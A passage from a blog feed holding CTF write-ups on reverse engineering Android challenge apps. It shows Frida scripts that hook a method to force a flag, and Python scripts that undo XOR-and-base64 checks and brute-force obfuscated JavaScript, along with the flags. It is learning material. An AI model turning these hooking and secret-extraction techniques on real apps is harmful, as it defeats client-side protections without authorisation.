  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot1.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I first installed the app in my genymotion emulator to see the basic functionality. There is a padlock icon
constantly changing position on the screen and text at the bottom that says &lt;code&gt;20000 to break the lock&lt;/code&gt;.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot2.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;When I click on the padlock the number decreases by 1. This is definitely chasing a lock as the challenge name.&lt;/p&gt;
&lt;p&gt;The goal seems pretty straightforward, we need to get the value to zero to get the flag. Now to decompile the app and see if we
can find a way. Like my previous writeup, I&amp;rsquo;ll use jadx-gui.&lt;/p&gt;
&lt;p&gt;From the AndroidManifest.xml we get the MainActivity that is loaded when the app starts.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot3.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Looking at the MainActivity code we see a switcher object being initialized just before the if statement that does some
check before displaying the flag. The switcher object has a method &lt;code&gt;run&lt;/code&gt; that takes in a value &lt;code&gt;i&lt;/code&gt; and the output is checked
if it&amp;rsquo;s not null and then the flag is displayed.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot4.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Let&amp;rsquo;s look at run method in the switcher class as it&amp;rsquo;s output determines whether the flag is displayed.
In the switcher code we can see the method &lt;code&gt;run&lt;/code&gt;. Instead of trying to figure out what each line does, I saw it easier to just hook into
this method and manipulate the &lt;code&gt;i&lt;/code&gt; value, which at this point I believe is the 20000 value.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot5.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I found two ways to solve this with frida, the run method was actually the one returning the flag:&lt;/p&gt;
&lt;p&gt;First one is to hook into the method and change the input value &lt;code&gt;i&lt;/code&gt; as it gets called.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Java&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;perform&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){
  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcher&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Java&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;com.example.razictf_2.switcher&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;;
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hooking...&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;overload&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;int&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;implementation&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;){
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Original Input: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;)
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Original return: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt;)
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Modified Input: 0&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[*] Modified return: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt;;
 };
});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;When I click on the padlock in the app, the flag is given.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot6.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Second one is to just initialize the switcher object ourselves and call the run method directly with our input without hooking.
This way I don&amp;rsquo;t need to interact with the app.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Java&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;perform&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){
  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcher&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Java&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;use&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;com.example.razictf_2.switcher&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcherInstance&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;$new&lt;/span&gt;();
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Flag: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;switcherInstance&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/razictf_2020/screenshot7.png&#34;  alt=&#34;razictf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;&lt;code&gt;Flag:  RaziCTF{IN_HATE_0F_RUNN!NG_L0CK5}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This was a good learning experience for me especially the second part which is quicker and has less code.&lt;/p&gt;
&lt;p&gt;You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p&gt;
&lt;p&gt;Twitter: &lt;a href=&#34;https://twitter.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Github: &lt;a href=&#34;https://github.com/ikuamike&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ikuamike&lt;/a&gt;

&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>CyberSpaceKenya CTF: ZuluMeats3</title>
      <link>https://blog.ikuamike.io/posts/2020/cyberspacectf-zulumeats3/</link>
      <pubDate>Fri, 12 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2020/cyberspacectf-zulumeats3/</guid>
      <description></description>
      <content>&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;I recently worked on a CTF challenge by &lt;a href=&#34;https://twitter.com/CyberSpaceKenya&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CyberSpace Kenya&lt;/a&gt;

 which I ended up winning. This is a writeup on how I solved the challenge. We were provided with an android app to reverse engineer and submit 3 flags.&lt;/p&gt;
&lt;h2 id=&#34;flag-3&#34;&gt;Flag 3&lt;/h2&gt;
&lt;p&gt;I haven&amp;rsquo;t done tons of mobile app reverse engineering but as I was learning about the subject in previous challenges I found this 2-step approach to work well:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Extracting the apk contents with apktool&lt;/li&gt;
&lt;li&gt;Reversing the app code with jadx-gui&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Using apktool is pretty simple just run this command on the apk:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&amp;gt; apktool d cyberspace-ctf.apk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This generates files in a folder cyberspace-ctf as below:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.
âââ AndroidManifest.xml
âââ apktool.yml
âââ assets
âââ lib
âââ original
âââ res
âââ smali
âââ unknown
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Checking the AndroidManifest.xml and res/values/strings.xml doesn&amp;rsquo;t reveal any flag. Usually grepping recursively through the apk files for interesting names would hint at something. After a few tries with the words flag, flag1, flag2, flag3 I got some interesting output.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf1.png&#34;  alt=&#34;cyberspacectf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Without much thought I opened jadx to find more mentions of that ValidateFlag3 and found the code.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf2.png&#34;  alt=&#34;cyberspacectf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Reading through the code I was able to figure out that the validate function does the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;takes our input&lt;/li&gt;
&lt;li&gt;xor encrypts it with a key(which is generated by getKey() function)&lt;/li&gt;
&lt;li&gt;base64 encodes it&lt;/li&gt;
&lt;li&gt;checks if it is equal to the hardcoded flag3.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;From previous experience I know that with xor encryption if you have the key and the encrypted data getting the plain text output is simple. Let me illustrate:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;encrypted = key ^ plaintext
plaintext = key ^ encrypted
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Getting the code to work in java isn&amp;rsquo;t as easy so I decided to use python and script the solution.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64

key1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hUZAf9gFIARRFTAvKRDs8A==&amp;#34;&lt;/span&gt;
key2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gp9jPELztMsd51Ih81gO0Q==&amp;#34;&lt;/span&gt;
flag3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RJ9qOOqa7pAinT19vyuQRHOGSi3FnPW5La0BYb4tnw==&amp;#34;&lt;/span&gt;

data1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(key1)
data2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(key2)
key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(data2)):
    key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(data1[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; data2[i])

decodedflag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(flag3)
encryptedFlag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(encryptedFlag)):
    decodedflag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(encryptedFlag[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; len(key)])

b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [chr(s) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; decodedflag]

&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(b))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Flag 3: &lt;code&gt;CFI{plz_no_secret_in_java_code}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Since I found flag3 first I must have missed some stuff.&lt;/p&gt;
&lt;h2 id=&#34;flag-1&#34;&gt;Flag 1&lt;/h2&gt;
&lt;p&gt;Refering back to my earlier screenshot, after performing the grep there&amp;rsquo;s some base64 encoded data which I should have been more keen to look at!&lt;/p&gt;
&lt;p&gt;base64:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Q1NfS0V7YmFzZTY0X2VuY29kaW5nX2lzX25vdF90aGF0X3NlY3VyZX0=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Flag 1: &lt;code&gt;CS_KE{base64_encoding_is_not_that_secure}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;flag-2&#34;&gt;Flag 2&lt;/h2&gt;
&lt;p&gt;Now flag 2 was the last to find. Since most of the clues we have been finding were in that &lt;code&gt;assets/index.android.bundle&lt;/code&gt; file let me have a look at it.&lt;/p&gt;
&lt;p&gt;&lt;del&gt;Something I noted was that jadx didnât find this file, that why the approach to use two tools is good IMO.&lt;/del&gt; A friend of mine has pointed out that it was actually there under Resources/assets on the jadx ui, nevertheless using two or more tools for analysis is still a good practice IMO. There is a lot of code in this file that is not easily readable, so I just googled what this file is.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf3.png&#34;  alt=&#34;cyberspacectf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I found that this file contains minified-javascript, it is created when an android app is developed using react. We already saw mentions of react when reading the code in jadx.&lt;/p&gt;
&lt;p&gt;Reading the code in it&amp;rsquo;s minified form isn&amp;rsquo;t easy so js-beautifier to the rescue. I then opened the readable version in vs code and searched for the validateflag function again.&lt;/p&gt;
&lt;p&gt;I landed here and we can clearly see the function that contained the base64 and the the other one that called flag3, due to their order flag 2 is what is left.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf4.png&#34;  alt=&#34;cyberspacectf&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I took the same approach to porting the code to python as it is easier for me to work with. I had to do a bit of googling to understand the js flow but came up with this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(n):
    t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; r &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(n)):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; r:
            t &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            t &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; len(n) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
        u &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ord(n[r]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; t
        e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(str(u))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;At the end, the output of the function is checked if it is equal to that list of numbers which is a hex representation of characters. Instead of trying to undo the transformation that was going on in the function where they add 13&amp;hellip; which I tried for a few hours and failed, better to bruteforce all possibilities.&lt;/p&gt;
&lt;p&gt;I came up with this script for that:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; string

k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;141&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;151&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;144&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;141&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;134&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;166&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;146&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;158&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;172&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;158&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;192&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;166&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;197&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;176&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;204&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;190&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;210&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;209&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;201&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;206&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;229&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;204&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;232&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;228&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;246&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;220&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;253&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;234&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;245&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;258&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;268&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;250&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;262&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;282&lt;/span&gt;]

all &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; string&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;printable

a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt;
flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [a[i] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(a))]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;(n):
    t &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; r &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(n)):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; r:
            t &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            t &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; len(n) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
        u &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ord(n[r]) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; t
        e&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(str(u))
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; e

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(flag)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(all)):
        flag[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; all[j]
        out &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f(flag)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; out[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; str(k[i]):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(flag))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Flag 2: &lt;code&gt;CFI{obfuscated_javascript_is_not_secured}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This was a good ctf for practising some code review. I also had never played around with an app made with react so that was something I learnt.&lt;/p&gt;
